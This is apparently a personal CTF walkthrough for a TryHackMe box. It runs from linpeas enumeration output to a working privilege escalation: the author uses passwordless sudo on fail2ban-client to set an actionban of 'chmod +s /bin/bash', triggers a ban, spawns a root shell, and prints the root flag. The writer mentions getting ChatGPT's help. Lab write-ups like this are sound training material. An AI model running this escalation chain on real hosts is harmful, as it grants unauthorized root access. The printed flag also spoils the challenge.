   908	  \u2514\u2500(Allow rules in default context)
   909	             \u2514\u2500 		<allow own="com.redhat.PrinterDriversInstaller"/>
   910	        		<allow send_destination="com.redhat.PrinterDriversInstaller"
   911	Analyzing /etc/dbus-1/system.d/com.ubuntu.SoftwareProperties.conf:
   912	  \u2514\u2500(Allow rules in default context)
   913	             \u2514\u2500     <allow send_destination="com.ubuntu.SoftwareProperties"
   914	            <allow send_destination="com.ubuntu.SoftwareProperties"
   915	            <allow send_destination="com.ubuntu.DeviceDriver"
   916	Analyzing /etc/dbus-1/system.d/net.hadess.SensorProxy.conf:
   917	  \u2514\u2500(Weak user policy found)
   918	     \u2514\u2500   <policy user="geoclue">
   919	  \u2514\u2500(Allow rules in default context)
   920	             \u2514\u2500     <allow send_destination="net.hadess.SensorProxy" send_interface="net.hadess.SensorProxy"/>
   921	            <allow send_destination="net.hadess.SensorProxy" send_interface="org.freedesktop.DBus.Introspectable"/>
   922	            <allow send_destination="net.hadess.SensorProxy" send_interface="org.freedesktop.DBus.Properties"/>
   923	            <allow send_destination="net.hadess.SensorProxy" send_interface="org.freedesktop.DBus.Peer"/>
   924	Analyzing /etc/dbus-1/system.d/net.hadess.SwitcherooControl.conf:
   925	  \u2514\u2500(Allow rules in default context)
   926	             \u2514\u2500     <allow send_destination="net.hadess.SwitcherooControl"
   927	            <allow send_destination="net.hadess.SwitcherooControl"
   928	Analyzing /etc/dbus-1/system.d/org.freedesktop.GeoClue2.Agent.conf:
   929	  \u2514\u2500(Weak user policy found)
   930	     \u2514\u2500   <policy user="geoclue">
   931	Analyzing /etc/dbus-1/system.d/org.freedesktop.GeoClue2.conf:
   932	  \u2514\u2500(Weak user policy found)
   933	     \u2514\u2500   <policy user="geoclue">
   934	  \u2514\u2500(Allow rules in default context)
   935	             \u2514\u2500          only share the location if user allows it. -->
   936	            <allow send_destination="org.freedesktop.GeoClue2"/>
   937	Analyzing /etc/dbus-1/system.d/org.freedesktop.ModemManager1.conf:
   938	  \u2514\u2500(Allow rules in default context)
   939	             \u2514\u2500     <!-- Methods listed here are explicitly allowed or PolicyKit protected.
   940	Analyzing /etc/dbus-1/system.d/org.freedesktop.PackageKit.conf:
   941	  \u2514\u2500(Allow rules in default context)
   942	             \u2514\u2500     <allow send_destination="org.freedesktop.PackageKit"
   943	            <allow send_destination="org.freedesktop.PackageKit"
   944	            <allow send_destination="org.freedesktop.PackageKit"
   945	Analyzing /etc/dbus-1/system.d/org.freedesktop.realmd.conf:
   946	  \u2514\u2500(Allow rules in default context)
   947	             \u2514\u2500 		<allow send_destination="org.freedesktop.realmd" />
   948	Analyzing /etc/dbus-1/system.d/org.opensuse.CupsPkHelper.Mechanism.conf:
   949	  \u2514\u2500(Allow rules in default context)
   950	             \u2514\u2500     <allow send_destination="org.opensuse.CupsPkHelper.Mechanism"/>
   951	Analyzing /etc/dbus-1/system.d/pulseaudio-system.conf:
   952	  \u2514\u2500(Weak user policy found)
   953	     \u2514\u2500   <policy user="pulse">
   954	Analyzing /etc/dbus-1/system.d/wpa_supplicant.conf:
   955	  \u2514\u2500(Weak group policy found)
   956	     \u2514\u2500         <policy group="netdev">
   957	
   958	\u2550\u2550\u2563 D-Bus Session Bus Analysis
   959	(Access to session bus available)
   960	
   961	
   962	\u2554\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2563 Legacy r-commands (rsh/rlogin/rexec) and host-based trust
   963	
   964	\u2550\u2550\u2563 Listening r-services (TCP 512-514)
   965	
   966	\u2550\u2550\u2563 systemd units exposing r-services
   967	rlogin|rsh|rexec units Not Found
   968	
   969	\u2550\u2550\u2563 inetd/xinetd configuration for r-services
   970	/etc/inetd.conf Not Found
   971	/etc/xinetd.d Not Found
   972	
   973	\u2550\u2550\u2563 Installed r-service server packages
   974	  No related packages found via dpkg
   975	
   976	\u2550\u2550\u2563 /etc/hosts.equiv and /etc/shosts.equiv
   977	
   978	\u2550\u2550\u2563 Per-user .rhosts files
   979	.rhosts Not Found
   980	
   981	\u2550\u2550\u2563 PAM rhosts authentication
   982	/etc/pam.d/rlogin|rsh Not Found
   983	
   984	\u2550\u2550\u2563 SSH HostbasedAuthentication
   985	  HostbasedAuthentication no or not set
   986	
   987	\u2550\u2550\u2563 Potential DNS control indicators (local)
   988	  Not detected
   989	
   990	\u2554\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2563 Crontab UI (root) misconfiguration checks
   991	\u255a https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#scheduledcron-jobs
   992	crontab-ui Not Found


812 :1.1309 61934 busctl asterisk :1.1309 apache2.service - - 813 :1.14 864 cupsd root 852 \u2514\u2500(Running as root) 853 \u2514\u2500 Interfaces: 854 `-/net` 855 `-/net/hadess` 856 `-/net/hadess/PowerProfiles` 857 \u2514\u2500(Potential privilege escalation vector) 858 \u2514\u2500 Try: busctl call net.hadess.PowerProfiles / [Interface] [Method] [Arguments] 859 \u2514\u2500 Or: dbus-send --session --dest=net.hadess.PowerProfiles / [Interface] [Method] [Arguments]


-rwsr-xr-x 1 root root 26776 Jan 31 2023 /usr/bin/pkexec

is this worth looking into or should I keep hunting down busctl?

busctl --system list | grep -i hadess || true net.hadess.PowerProfiles 742 power-profiles- root :1.4 power-profiles-daemon.service - - net.hadess.SwitcherooControl 745 switcheroo-cont root :1.8 switcheroo-control.service - - Process 63546 created. Channel 10 created. busctl --system list | grep -i hadess || true net.hadess.PowerProfiles 742 power-profiles- root :1.4 power-profiles-daemon.service - - net.hadess.SwitcherooControl 745 switcheroo-cont root :1.8 switcheroo-control.service - - busctl --user list | grep -i hadess || true Failed to set bus address: $DBUS_SESSION_BUS_ADDRESS and $XDG_RUNTIME_DIR not defined (consider using --machine=<user>@.host --user to connect to bus of other user) 

wait is busctl used to spawn remote connections with user@.host? and I own the process as asterisk lol

I am somewhat at a croosroads here

idk I got off those and started looking at failtoban because I can run as root without PW and any functionality I can get out of that is worth exploring

sudo -l    
Matching Defaults entries for asterisk on ip-10-201-15-159:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

Runas and Command-specific defaults for asterisk:
    Defaults!/usr/bin/fail2ban-client !requiretty

User asterisk may run the following commands on ip-10-201-15-159:
    (ALL) NOPASSWD: /usr/bin/fail2ban-client
fail2ban-client -help


Fail2Ban v1.0.2

   738	fail2ban.service: Uses relative path 'ExecStart=/usr/bin/fail2ban-server' (from # ExecStart=/usr/bin/fail2ban-server -xf --logtarget=sysout start)
fail2ban-client | grep -i "command"
Usage: fail2ban-client [OPTIONS] <COMMAND>
Command:
    set <JAIL> ignorecommand <VALUE>         sets ignorecommand of <JAIL>
                                             else will be a Command Action
                                             COMMAND ACTION CONFIGURATION
                                             sets the start command <CMD> of
    set <JAIL> action <ACT> actionstop <CMD> sets the stop command <CMD> of the
                                             sets the check command <CMD> of
    set <JAIL> action <ACT> actionban <CMD>  sets the ban command <CMD> of the
                                             sets the unban command <CMD> of
                                             sets <TIMEOUT> as the command
    get <JAIL> ignorecommand                 gets ignorecommand of <JAIL>
                                             COMMAND ACTION INFORMATION
    get <JAIL> action <ACT> actionstart      gets the start command for the
    get <JAIL> action <ACT> actionstop       gets the stop command for the
    get <JAIL> action <ACT> actioncheck      gets the check command for the
    get <JAIL> action <ACT> actionban        gets the ban command for the
    get <JAIL> action <ACT> actionunban      gets the unban command for the
    get <JAIL> action <ACT> timeout          gets the command timeout in


so this can be ran as root without a password and it supports commands

sudo /usr/bin/fail2ban-client set asterisk-iptables banip 1.1.1.1

eventually out of /usr/bin I read enough about fail2ban options and had chatgpt help me figure out the rce

sudo fail2ban-client set asterisk-iptables action iptables-allports-ASTERISK actionban 'chmod +s /bin/bash'
chmod +s /bin/bash
sudo fail2ban-client set asterisk-iptables banip 8.8.8.8
1
ls -la /bin/bash
-rwsr-sr-x 1 root root 1265648 Apr 18 13:47 /bin/bash
/bin/bash -p
whoami
root
cd /root
ls
filename
passwordMysql.log
root.txt
cat root.txt
THM{33ad5b530e71a172648f424ec23fae60}

